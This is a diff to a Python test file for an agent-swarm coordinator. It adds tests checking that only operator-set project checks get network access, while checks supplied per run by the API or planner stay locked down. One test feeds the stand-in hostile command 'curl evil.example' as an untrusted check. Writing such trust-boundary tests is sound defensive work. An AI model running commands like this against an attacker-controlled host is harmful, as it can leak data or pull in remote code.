@@ -55,8 +55,10 @@ class _StubVerifier:
 
     def __init__(self, passed: bool) -> None:
         self._passed = passed
+        self.networks: list[str | None] = []
 
-    async def verify(self, node, workspace) -> VerifyResult:
+    async def verify(self, node, workspace, *, network=None) -> VerifyResult:
+        self.networks.append(network)
         return VerifyResult(passed=self._passed, output=f"check {'ok' if self._passed else 'red'}")
 
 
@@ -179,3 +181,40 @@ def test_pr_opener_without_gh(monkeypatch):
         assert res.url is None and "gh" in res.error
 
     asyncio.run(scenario())
+
+
+# ---- project-check trust boundary -----------------------------------------
+# The acceptance gate needs network to reach Qdrant/Ollama, but node checks are
+# LLM-authored. Only an operator-set (env default) project check may be widened;
+# a per-run check arriving via the API or planner must not be.
+
+
+def test_operator_project_check_gets_the_project_network(tmp_path, monkeypatch):
+    monkeypatch.setenv("ZEUS_SWARM_PROJECT_CHECK", "scripts/acceptance.py")
+    monkeypatch.setenv("ZEUS_SWARM_VERIFY_PROJECT_NETWORK", "zeus_default")
+    store = SwarmStore(str(tmp_path / "s.db"))
+    ver = _StubVerifier(True)
+    coord = Coordinator(store, StubWorker(), None, ver, NullNotifier(), _FakeOpener())
+
+    async def scenario():
+        rid = await _run_to_final(store, coord)
+        view = await store.get_view(rid)
+        await coord.resolve(rid, _final_approval_id(view), True)
+
+    asyncio.run(scenario())
+    assert ver.networks == ["zeus_default"]
+
+
+def test_run_supplied_project_check_stays_locked_down(tmp_path, monkeypatch):
+    monkeypatch.setenv("ZEUS_SWARM_VERIFY_PROJECT_NETWORK", "zeus_default")
+    store = SwarmStore(str(tmp_path / "s.db"))
+    ver = _StubVerifier(True)
+    coord = Coordinator(store, StubWorker(), None, ver, NullNotifier(), _FakeOpener())
+
+    async def scenario():
+        rid = await _run_to_final(store, coord, project_check="curl evil.example")
+        view = await store.get_view(rid)
+        await coord.resolve(rid, _final_approval_id(view), True)
+
+    asyncio.run(scenario())
+    assert ver.networks == [None], "untrusted check must fall through to verify_network()"
